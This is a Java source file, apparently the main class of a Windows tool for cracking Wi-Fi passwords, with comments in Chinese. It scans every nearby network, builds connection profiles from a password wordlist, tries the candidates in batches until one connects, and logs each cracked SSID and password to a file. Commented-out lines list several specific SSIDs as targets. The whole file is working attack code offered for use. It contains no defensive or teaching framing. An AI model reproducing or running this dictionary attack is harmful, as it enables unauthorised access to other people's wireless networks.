package io.github.weechang;

import io.github.weechang.cmd.WlanExecute;
import io.github.weechang.generator.ProfileGenerator;
import io.github.weechang.util.FileUtils;

import java.util.List;

/**
 * 连接配置文件
 */
public class Connector {

    /**
     * 密码路径
     */
    public static final String PASSWORD_PATH = "D:\\wlan\\password\\wake1.txt";

    /**
     * 配置文件暂时存放路径
     */
    public static final String PROFILE_TEMP_PATH = "D:\\wlan\\profile";

    /**
     * 破解成功wifi存放路径
     */
    public static final String RESULT_PATH = "D:\\wlan\\record.txt";

    /**
     * 日志存放路径
     */
    public static final String LOG_PATH = "D:\\wlan\\log.txt";

    /**
     * 批处理密码数量
     */
    public static final int BATH_SIZE = 1000;

    /**
     * 要ping的域名
     */
    public static final String PING_DOMAIN = "www.baidu.com";

    /**
     * 生成配置文件
     */
    public static void genProfile(String ssid) {
        ProfileGenerator profileGenerator = new ProfileGenerator(ssid, PASSWORD_PATH);
        profileGenerator.genProfile();
    }

    /**
     * 根据密码验证配置文件
     */
    public static String check(String ssid) {
        String password = null;
        List<String> passwordList = null;
        int counter = 0;
        outer:
        while (true) {
            int start = counter * BATH_SIZE;
            int end = (counter + 1) * BATH_SIZE - 1;
            passwordList = FileUtils.readLine(PASSWORD_PATH, start, end);
            if (passwordList != null && passwordList.size() > 0) {
                for (String item : passwordList) {
                    boolean checked = WlanExecute.check(ssid, item);
                    if (checked) {
                        password = item;
                        break outer;
                    }
                }
                counter++;
            } else {
                break outer;
            }
        }
        return password;
    }


    /**
     * 整体步骤如下：
     * <p>
     * -- step1. 扫所有可用的，信号较好的WIFI
     * -- step2. 根据密码批量生成配置文件
     * -- step3. 根据密码一个一个配置文件验证，直到找到正确的密码
     */
    public static void main(String[] args) {
        // step1
        List<String> ssidList = WlanExecute.listSsid();

//        ssidList.clear();
//        ssidList.add("Tenda_2E85A8");
//        ssidList.add("HUAWEI_P9_ZW");
//        ssidList.add("TP-LINK_5410");
//        ssidList.add("ChinaNet-WWS2");

        if (ssidList != null && ssidList.size() > 0) {
            for (String ssid : ssidList) {
                long start = System.currentTimeMillis();
                // step2
                genProfile(ssid);
                // step3
                String password = check(ssid);

                long end = System.currentTimeMillis();
                System.out.println("耗时：" + (end - start) / 1000 + "秒");
                if (password != null) {
                    System.out.println("无线网络破解成功，密码：" + password);
                    String record = "ssid:" + ssid + ",password:" + password;
                    FileUtils.appendToFile(RESULT_PATH, record);
                } else {
                    System.out.println("无线网络破解失败");
                }
            }
        }
    }

}
